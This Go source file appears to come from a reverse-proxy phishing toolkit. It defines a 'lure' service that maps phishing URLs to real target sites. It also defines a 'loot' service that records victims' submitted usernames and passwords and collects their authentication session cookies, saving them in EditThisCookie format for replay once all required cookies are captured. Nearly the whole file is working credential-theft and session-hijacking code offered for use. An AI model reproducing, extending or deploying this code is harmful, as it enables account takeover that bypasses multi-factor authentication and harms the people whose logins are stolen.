package main

import (
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/session"
	"go.uber.org/multierr"
	"gopkg.in/yaml.v3"
)

type APILure struct {
	LureURL   string `json:"lure_url" yaml:"lure_url" validate:"required,uri"`
	TargetURL string `json:"target_url" yaml:"target_url" validate:"required,url"`
	Name      string `json:"name" yaml:"name"`
}

type LureService interface {
	ExistsByURL(lureURL string) (bool, error)
	GetByURL(lureURL string) (*APILure, error)
	Add(lure *APILure) error
	DeleteByURL(lureURL string) error
	GetAll() ([]*APILure, error)
}

type ByteSource interface {
	ReadAll() ([]byte, error)
	WriteAll(p []byte) error
}

func NewLureService(source ByteSource) (LureService, error) {
	data, err := source.ReadAll()
	if err != nil {
		return nil, err
	}
	luresMap, err := parseLuresConfig(data)
	if err != nil {
		return nil, err
	}
	return &lureService{luresMap: luresMap, source: source}, nil
}

func parseLuresConfig(data []byte) (mp map[string]*APILure, err error) {
	var doc struct {
		Lures []*APILure `yaml:"lures"`
	}
	if err = yaml.Unmarshal(data, &doc); err != nil {
		return
	}
	mp = make(map[string]*APILure)
	for _, lure := range doc.Lures {
		mp[lure.LureURL] = lure
	}
	return
}

type lureService struct {
	mu       sync.RWMutex
	source   ByteSource
	luresMap map[string]*APILure
}

func (s *lureService) ExistsByURL(url string) (bool, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	_, exists := s.luresMap[url]
	return exists, nil
}

func (s *lureService) GetByURL(url string) (*APILure, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.luresMap[url], nil
}

func (s *lureService) Add(lure *APILure) error {
	if err := validate.Struct(lure); err != nil {
		return err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.luresMap[lure.LureURL] = lure
	return s.flush()
}

func (s *lureService) DeleteByURL(lureURL string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.luresMap, lureURL)
	return s.flush()
}

func (s *lureService) GetAll() ([]*APILure, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.getAll(), nil
}

func (s *lureService) flush() error {
	values := s.getAll()
	data, err := yaml.Marshal(map[string]interface{}{
		"lures": values,
	})
	return multierr.Append(err, s.source.WriteAll(data))
}

func (s *lureService) getAll() []*APILure {
	lures := make([]*APILure, 0, len(s.luresMap))
	for _, v := range s.luresMap {
		lures = append(lures, v)
	}
	sort.Slice(lures, func(i, j int) bool {
		return lures[i].Name < lures[j].Name
	})
	return lures
}

type FileByteSource struct {
	filename string
}

func (s *FileByteSource) ReadAll() ([]byte, error) {
	if _, err := os.Stat(s.filename); err != nil {
		return nil, nil
	}
	return os.ReadFile(s.filename)
}

//nolint:gosec
func (s *FileByteSource) WriteAll(p []byte) error {
	tmpPath := s.filename + ".tmp"
	if err := os.WriteFile(tmpPath, p, 0644); err != nil {
		return err
	}
	// Atomic operation on most filesystems
	return os.Rename(tmpPath, s.filename)
}

type APILoginInfo struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LootService interface {
	CookieSaver
	SaveCreds(c *fiber.Ctx, info *APILoginInfo) error
}

func NewLootService(credsRepo CredsRepository, sessionRepo SessionRepository,
	sessionCookies []*SessionCookieConfig) *lootService {
	cookieAllRegexp := getDomainCookieNamesRegexp(sessionCookies)

	var requiredCookies []*SessionCookieConfig
	for _, cookie := range sessionCookies {
		if cookie.Required {
			requiredCookies = append(requiredCookies, cookie)
		}
	}
	cookieRequiredRegexp := getDomainCookieNamesRegexp(requiredCookies)

	return &lootService{
		credsRepo:            credsRepo,
		sessionRepo:          sessionRepo,
		cookieAllRegexp:      cookieAllRegexp,
		cookieRequiredRegexp: cookieRequiredRegexp,
		requiredCookiesNum:   len(requiredCookies)}
}

func getDomainCookieNamesRegexp(cookies []*SessionCookieConfig) map[string]*regexp.Regexp {
	cookiesByDomain := make(map[string][]*SessionCookieConfig)
	for _, cookie := range cookies {
		domain := strings.TrimPrefix(cookie.Domain, ".")
		cookiesByDomain[domain] = append(cookiesByDomain[domain], cookie)
	}
	result := make(map[string]*regexp.Regexp)
	for domain, domainCookies := range cookiesByDomain {
		reStrings := make([]string, 0, len(domainCookies))
		for _, cookie := range domainCookies {
			name := cookie.Name
			if !cookie.Regexp {
				name = regexp.QuoteMeta(name)
			}
			reStrings = append(reStrings, "(^"+name+"$)")
		}
		result[domain] = regexp.MustCompile(strings.Join(reStrings, "|"))
	}
	return result
}

type lootService struct {
	credsRepo   CredsRepository
	sessionRepo SessionRepository
	// cookieAllRegexp contains map from cookie domain name to regexp that matches
	// all session cookie names for this domain
	cookieAllRegexp map[string]*regexp.Regexp
	// cookieRequiredRegexp contains map from cookie domain name to regexp that matches
	// all required session cookie names for the given domain which must be collected
	// in order to persist a session
	cookieRequiredRegexp map[string]*regexp.Regexp
	sessions             sync.Map
	requiredCookiesNum   int
}

func (s *lootService) SaveCreds(c *fiber.Ctx, info *APILoginInfo) error {
	sess := getSession(c)
	dbInfo := &DBLoginInfo{
		Username:  info.Username,
		Password:  info.Password,
		Date:      time.Now().UTC(),
		SessionID: sess.ID(),
		LureURL:   getLureURL(sess),
	}
	return s.credsRepo.SaveCreds(dbInfo)
}

// SessionCookie is a captured session cookie in EditThisCookie format
type SessionCookie struct {
	Domain   string `json:"domain"`
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HTTPOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
	SameSite string `json:"sameSite"`
	ID       string `json:"id,omitempty"`
	StoreID  string `json:"storeId,omitempty"`
	// UNIX timestamp
	ExpirationDate float64 `json:"expirationDate,omitempty"`
	Session        bool    `json:"session"`
}

type sessionContext struct {
	// TODO UserAgent
	mu              sync.RWMutex
	allCookies      map[string]*SessionCookie
	requiredCookies map[string]struct{}
	isAuthenticated bool
}

func newSessionContext() *sessionContext {
	return &sessionContext{
		allCookies:      make(map[string]*SessionCookie),
		requiredCookies: make(map[string]struct{}),
	}
}

func (s *lootService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*http.Cookie) (err error) {
	if s.requiredCookiesNum == 0 {
		return
	}
	sess := getSession(c)
	sessCtx := s.getOrCreateSessionContext(sess.ID())
	sessCtx.mu.Lock()
	defer sessCtx.mu.Unlock()
	if sessCtx.isAuthenticated {
		return
	}
	for _, cookie := range cookies {
		s.saveCookie(sessCtx, destURL, cookie)
	}
	if len(sessCtx.requiredCookies) == s.requiredCookiesNum {
		log.Printf("lureURL: %s sid: %s session cookies are captured!\n", getLureURL(sess), sess.ID())
		err = s.saveCapturedSession(sess, sessCtx)
		sessCtx.isAuthenticated = true
	}
	return
}

func (s *lootService) saveCapturedSession(sess *session.Session, sessCtx *sessionContext) error {
	cookies := make([]*SessionCookie, 0, len(sessCtx.allCookies))
	for _, cookie := range sessCtx.allCookies {
		cookies = append(cookies, cookie)
	}
	return s.sessionRepo.SaveSession(&DBCapturedSession{
		SessionID: sess.ID(),
		LureURL:   getLureURL(sess),
		Cookies:   cookies,
	})
}

func (s *lootService) getOrCreateSessionContext(sessionID string) *sessionContext {
	// TODO sessionContext pool
	ctx, _ := s.sessions.LoadOrStore(sessionID, newSessionContext())
	return ctx.(*sessionContext)
}

func (s *lootService) getSessionContext(sessionID string) *sessionContext {
	ctx, ok := s.sessions.Load(sessionID)
	if !ok {
		return nil
	}
	return ctx.(*sessionContext)
}

func (s *lootService) IsAuthenticated(c *fiber.Ctx) bool {
	sess := getSession(c)
	if sess == nil {
		return false
	}
	sessCtx := s.getSessionContext(sess.ID())
	if sessCtx == nil {
		return false
	}
	sessCtx.mu.RLock()
	defer sessCtx.mu.RUnlock()
	return sessCtx.isAuthenticated
}

func (s *lootService) saveCookie(sessCtx *sessionContext, destURL *url.URL, cookie *http.Cookie) {
	if cookie.Expires.Before(time.Now()) {
		return
	}
	domain := getCookieDomain(destURL, cookie)
	allRe, ok := s.cookieAllRegexp[domain]
	if !ok {
		return
	}
	if !allRe.MatchString(cookie.Name) {
		return
	}
	sessionCookie := newSessionCookie(destURL, cookie)
	cookieKey := domain + ":" + cookie.Name
	sessCtx.allCookies[cookieKey] = sessionCookie

	if requiredRe, ok := s.cookieRequiredRegexp[domain]; ok && requiredRe.MatchString(cookie.Name) {
		sessCtx.requiredCookies[cookieKey] = struct{}{}
	}
}

func (s *lootService) DeleteSession(sessionID string) {
	s.sessions.Delete(sessionID)
}

func newSessionCookie(destURL *url.URL, cookie *http.Cookie) *SessionCookie {
	result := &SessionCookie{
		Domain:   getCookieDomain(destURL, cookie),
		Name:     cookie.Name,
		Value:    cookie.Value,
		Path:     cookie.Path,
		HTTPOnly: cookie.HttpOnly,
		Secure:   cookie.Secure,
		SameSite: mapSameSite(cookie.SameSite),
	}
	if cookie.Expires.IsZero() {
		result.Session = true
	} else {
		result.ExpirationDate = float64(cookie.Expires.UnixNano()) / 1e9
	}
	if result.Path == "" {
		result.Path = "/"
	}
	return result
}

func mapSameSite(mode http.SameSite) string {
	switch mode {
	case http.SameSiteLaxMode:
		return "lax"
	case http.SameSiteStrictMode:
		return "strict"
	default:
		return "no_restriction"
	}
}

func getCookieDomain(destURL *url.URL, cookie *http.Cookie) string {
	if cookie.Domain == "" {
		return destURL.Hostname()
	}
	return strings.TrimPrefix(cookie.Domain, ".")
}

type CookieSaver interface {
	SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*http.Cookie) error
}

func NewCookieService() CookieSaver {
	return &cookieService{}
}

type cookieService struct{}

func (*cookieService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*http.Cookie) error {
	cookieJar := getCookieJar(c)
	cookieJar.SetCookies(destURL, cookies)
	return nil
}

func NewMultiCookieSaver(delegates ...CookieSaver) CookieSaver {
	return &multiCookieSaver{delegates}
}

type multiCookieSaver struct {
	delegates []CookieSaver
}

func (s *multiCookieSaver) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*http.Cookie) (err error) {
	for _, delegate := range s.delegates {
		err = multierr.Append(err, delegate.SaveCookies(c, destURL, cookies))
	}
	return
}

// DB_TYPE = file / redis
// DB_URL =
// CREDS_FILE = creds.jsonl
// COOKIES_FILE = cookies.jsonl
